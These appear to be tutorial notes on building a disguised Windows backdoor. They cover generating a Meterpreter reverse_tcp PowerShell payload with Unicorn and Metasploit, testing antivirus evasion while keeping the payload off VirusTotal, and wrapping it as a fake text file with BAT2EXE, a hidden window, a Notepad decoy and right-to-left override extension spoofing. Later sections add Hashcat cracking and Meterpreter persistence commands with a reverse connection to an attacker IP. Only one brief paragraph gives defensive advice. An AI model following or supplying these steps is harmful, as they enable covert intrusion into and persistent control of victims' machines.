
Install Metasploit Framework

	apt-get remove metasploit-framework
	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
	chmod +x msfinstall		
	./msfinstall

When the installer is completed, there will be a new metasploit-framework/ directory in the /opt directory.

Install Unicorn

	git clone https://github.com/trustedsec/unicorn
	cd unicorn/
	./unicorn.py --help

Generate the Payload

	./unicorn.py windows/meterpreter/reverse_tcp <ATTACKER-IP-ADDRESS> <PORT>

Unicorn will use the Metasploit reverse_https module to connect to the attackers IP address using the specified port.
When Unicorn is done generating the payload, two new files will be created. The first is powershell_attack.txt and the unicorn.rc

	cat powershell_attack.txt

The other file created by Unicorn is unicorn.rc, a resource file which will automate the msfconsole setup and configuration.
Start Msfconsole Using the Resource File. To start Metasploit, run
	
	service postgresql start
	msfconsole -r /opt/unicorn/unicorn.rc
			
The resource file will automatically enable the handler (multi/handler), 
set the payload type (windows/meterpreter/reverse_tcp), 
set the attacker's IP address (LHOST), set the port number (LPORT), 
enable stager encoding (EnableStageEncoding true), 
and start the msfconsole listener (exploit -j) — easy.

Test the Payload (Don't Upload It to VirusTotal)
Many projects warn penetration testers of the dangers of using online virus scanners like VirusTotal. 
In the case of TheFatRat, the developer's explicitly caution against using VirusTotal every time the program starts.
uploading to online virus scanners is extremely damaging to these projects. 
VirusTotal shares uploaded payloads with third-parties and, as a result, their collective detection rates dramatically increase over a short period of time.
if it's discovered that a target on the local network is using Windows 10 with AVG or Avast, 
create a Windows 10 VM, install the latest antivirus software in the VM, and test payloads inside the VM. 

Once you have created a PowerShell payload to evade antivirus software and set up msfconsole on their attack system, 
they can then move onto disguising their executable to make it appear as a regular text file. 

The payload needs to be converted into a Windows executable (EXE). 
The icon (ICO file) will need to be changed as well to look like an ordinary text file. 
The biggest red flag that the fake text file is actually an executable is the file extension. 
Some Windows users disable the "Hide extensions for known file types" option to protect against file extension spoofing attacks. 

Save the PowerShell Payload
The following steps require a Windows operating system. I recommend using a Windows 10 virtual machine (VM) in VirtualBox.
The previously created PowerShell payload should be moved to the Windows system and saved as payload.bat using Notepad or a preferred text editor. 
The payload.bat will be manipulated to appear as a normal text file in proceeding steps.

Download the Windows 10 Icons

	git clone 'https://github.com/B00merang-Project/Windows-10-Icons'

Use text-x-generic.png located in the Windows-10-Icons/256x256/mimetypes/ directory, but any PNG will work 

Convert the PNG to ICO Format

	https://convertico.com/

Install BAT2EXE

	http://www.f2ko.de/en/b2e.php
	or
	https://github.com/tokyoneon/B2E/raw/master/Bat_To_Exe_Converter.zip

Unzip the download and run the "Bat_To_Exe_Converter_(Installer).exe"
	
Import the Payload BAT

Trojanize the Payload

	add the word "notepad" to the top of the payload.bat, and click "Save." 	

This will make the executable open Notepad on the Windows machine before executing the PowerShell payload. 
Doing this will make the target user believe the file they just clicked on is indeed a legitimate text file.

Convert & Export the Payload
check the "Icon" option to enable it, and import the fakeTextFile.ico icon created in the previous step using the "..." button. 
Then, change the Exe-Format to "64-bit Windows | (Invisible)" to prevent any terminals from popping up when the target user opens the file.
Click the "Convert" button to create the EXE, and save the filename as fake.exe.

Spoof the File Extension with Unicode
Use a Unicode character called "Right-to-Left Override" (RLO) to reverse the order of which the characters are displayed in the filename. 
That's important to understand since the characters aren't actually being reversed, 
how Windows displays the characters is being reversed. Windows will still recognize the file extension as EXE.

	https://unicode-table.com/en/202E/

How to Protect Against File Extension Spoofing Attacks
Since our whole objective here was to create an undetectable payload, antivirus software is not really a good option for protecting
against these types of file extension spoofing attacks.
One thing you can do is just put on your magnifying glass when looking at files you download off the internet.
If you're suspicious of a file or its source, try renaming it. 
Be careful not to double-click on it. Instead, right-click the file and choose the "Rename" option from the context menu. 
If Unicode is being used, renaming the file using characters found on standard keyboards will remove the Unicode, revealing its true extension.


Hashcat Password cracking

Copy the hash from the terminal

	hashcat -m [hash type] -a [attack mode] [hash] [wordlist file] 

	--force
	--show

MAKING THE application persistent
Metasploit has a script named persistence that can enable us to set up a persistent Meterpreter (listener) on the victim's system. 
First take a look at the options that are available when we run this scrip by using the –h switch.

	run persistence -h

    –A switch starts a matching handler to connect to the agent.
    -L switch tells the system where to place the Meterpreter on the target system.
    –P switch tells the system what payload to use (Windows/Meterpreter/reverse_tcp is the default, so we won't use this switch).
    -S starts the agent on boot with system privileges.
    -U starts the agent when the user (U) logs on.
    -x starts the agent when the system boots.
    –i indicate the time interval between each connection attempt.
    -p indicates the port, and finally...
    –r indicates the IP address of our ( r ) system running Metasploit.

	
	run persistence -A -L C:\\ -i 30 -p 8989 -r 192.168.43.189

	create MyServ binpath= c:\Users\root\Desktop\payload.exe type= own start= auto DisplayName= MyServ


